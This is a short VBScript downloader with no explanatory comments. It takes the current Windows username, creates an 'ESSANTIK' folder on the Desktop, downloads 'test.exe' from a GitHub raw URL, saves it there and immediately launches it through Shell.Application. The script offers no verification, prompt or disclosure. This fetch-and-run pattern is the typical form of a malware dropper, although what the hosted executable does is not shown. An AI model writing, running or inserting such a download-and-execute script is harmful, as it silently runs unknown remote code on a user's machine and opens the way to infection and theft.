Option Explicit
Dim objShell, objHTTP, url, savePath, objNetwork, strUsername, strOriginalSavePath, strSavePath ,desktopPath ,folderName , folderPath , LOC, objFSO


Set objNetwork = CreateObject("WScript.Network")
Set objShell = CreateObject("Shell.Application")
Set objHTTP = CreateObject("MSXML2.XMLHTTP")


strUsername = objNetwork.UserName
strOriginalSavePath = "C:\Users\%USERNAME%\Desktop\ESSANTIK\test.exe"
strSavePath = Replace(strOriginalSavePath, "%USERNAME%", strUsername)

Set objFSO = CreateObject("Scripting.FileSystemObject")
desktopPath = "C:\Users\" & strUsername & "\Desktop"
folderName = "ESSANTIK"
folderPath = desktopPath & "\" & folderName

If Not objFSO.FolderExists(folderPath) Then
    objFSO.CreateFolder folderPath
End If


url = "https://github.com/essantik/essantik/raw/main/test.exe"


' Download the file
objHTTP.Open "GET", url, False
objHTTP.send
If objHTTP.Status = 200 Then
    Dim objStream, outputStream
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Open
    objStream.Type = 1
    objStream.Write objHTTP.responseBody
    objStream.Position = 0
    objStream.SaveToFile strSavePath
    objStream.Close
    ' Set free
    Set objStream = Nothing
    Set objHTTP = Nothing
    ' Open
    objShell.Open strSavePath
End If


' Release the Shell object
Set objShell = Nothing